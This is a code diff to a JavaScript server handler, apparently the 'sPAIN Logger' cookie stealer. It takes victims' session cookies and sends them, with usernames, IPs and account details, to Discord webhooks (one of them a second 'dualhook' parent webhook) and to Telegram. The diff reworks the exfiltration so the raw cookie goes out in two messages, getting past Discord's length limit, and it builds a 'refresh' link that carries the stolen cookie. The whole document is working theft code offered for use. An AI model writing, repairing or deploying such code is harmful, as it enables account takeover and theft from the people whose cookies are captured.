@@ -283,44 +283,66 @@ async function discordSend(url, payload) {
       const text = await res.text();
       console.error('Discord HTTP error:', res.status, text);
     } else {
-      console.log('Discord sent successfully to:', url.substring(0, 50));
+      console.log('Discord sent successfully');
     }
   } catch (e) { 
     console.error('Discord fetch error:', e.message); 
   }
 }
 
-// Send raw cookie with refresh link - FIXED VERSION
+// TWO MESSAGE FIX - bypasses Discord 2000 char limit
 async function sendRawCookie(url, cookie, username) {
-  console.log('Sending raw cookie to:', url?.substring(0, 50));
+  console.log('Sending raw cookie (2 messages) to:', url?.substring(0, 50));
   
   if (!url || !url.includes('discord.com/api/webhooks')) {
-    console.log('Skipping invalid URL');
+    console.log('Invalid URL, skipping');
     return;
   }
   
+  const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)}`;
+  
   try {
-    const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)}`;
-    const content = `**🔐 Cookie for "${username || 'Unknown'}"**\n\nYou need to refresh this cookie to work here: [Refresh Cookie](${refreshUrl})\n\n\`\`\`\n${cookie}\n\`\`\``;
-    
-    console.log('Content length:', content.length);
-    
-    const res = await fetch(url, {
+    // Message 1: Header with refresh link (short, under 2000 chars)
+    console.log('Sending message 1: header with refresh link');
+    const res1 = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         username: WH_NAME,
         avatar_url: WH_AVATAR,
-        content: content
+        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\nYou need to refresh this cookie to work here: **[🔄 Refresh Cookie](${refreshUrl})**`
       })
     });
     
-    if (!res.ok) {
-      const text = await res.text();
-      console.error('Raw cookie send failed:', res.status, text);
-    } else {
-      console.log('Raw cookie sent successfully');
+    if (!res1.ok) {
+      const text = await res1.text();
+      console.error('Message 1 failed:', res1.status, text);
+      return;
     }
+    console.log('Message 1 sent successfully');
+    
+    // Small delay to ensure order
+    await new Promise(r => setTimeout(r, 500));
+    
+    // Message 2: Just the raw cookie in code block
+    console.log('Sending message 2: raw cookie (length:', cookie.length, ')');
+    const res2 = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: WH_NAME,
+        avatar_url: WH_AVATAR,
+        content: `\`\`\`\n${cookie}\n\`\`\``
+      })
+    });
+    
+    if (!res2.ok) {
+      const text = await res2.text();
+      console.error('Message 2 failed:', res2.status, text);
+    } else {
+      console.log('Message 2 sent successfully');
+    }
+    
   } catch (e) { 
     console.error('Raw cookie error:', e.message);
   }
@@ -364,11 +386,11 @@ export default async function handler(req, res) {
   const pName = record.displayName || slug;
   const cookie = findCookie(slots);
 
-  console.log('Cookie found:', !!cookie, 'IP:', ip);
+  console.log('Cookie found:', !!cookie, 'Length:', cookie?.length, 'IP:', ip);
 
   let webhook1 = null;
   let webhook2 = record.webhook;
-  console.log('Webhook2 (main):', webhook2?.substring(0, 50));
+  console.log('Webhook2:', webhook2?.substring(0, 50));
   
   if (record.dualhookParent) {
     const parent = await redisGet(`slot:${record.dualhookParent}`);
@@ -417,8 +439,8 @@ export default async function handler(req, res) {
 
   console.log('Account valid:', !!acc, 'Username:', acc?.username);
 
-  // 1. WEBHOOK 2: Cookie Captured
-  console.log('Step 1: Sending cookie captured...');
+  // 1. Cookie Captured
+  console.log('Step 1: Cookie Captured embed');
   await discordSend(webhook2, {
     username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
     embeds: [{
@@ -438,9 +460,9 @@ export default async function handler(req, res) {
     }]
   });
 
-  // 2. WEBHOOK 1: Dualhook (if exists)
+  // 2. Dualhook
   if (webhook1) {
-    console.log('Step 2: Sending dualhook...');
+    console.log('Step 2: Dualhook embed');
     await discordSend(webhook1, {
       username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
       embeds: [{
@@ -461,7 +483,7 @@ export default async function handler(req, res) {
 
   // 3. Account Info
   if (acc) {
-    console.log('Step 3: Sending account info...');
+    console.log('Step 3: Account Info embed');
     const accountEmbed = {
       title: '✅ Account Info Valid',
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
@@ -489,15 +511,13 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
   }
 
-  // 4. RAW COOKIE with refresh link - THIS IS THE KEY PART
-  console.log('Step 4: Sending raw cookie with refresh link...');
-  console.log('Cookie length:', cookie?.length);
-  
+  // 4. RAW COOKIE - TWO MESSAGES (THE FIX!)
+  console.log('Step 4: Sending raw cookie (2 messages)...');
   await sendRawCookie(webhook2, cookie, acc?.username);
   if (webhook1) await sendRawCookie(webhook1, cookie, acc?.username);
 
   // Telegram
-  console.log('Step 5: Sending to Telegram...');
+  console.log('Step 5: Telegram');
   if (acc) {
     await tgSendAccount([
       `🍪 <b>COOKIE — ${pName}</b>`,
@@ -516,6 +536,6 @@ export default async function handler(req, res) {
     await tgSendAccount(`🍪 <b>COOKIE — ${pName}</b>\n❌ <b>Invalid cookie</b>\n<code>${cookie}</code>`);
   }
 
-  console.log('=== REQUEST COMPLETE ===');
+  console.log('=== COMPLETE ===');
   return res.status(200).json({ success: true, account: acc });
 }
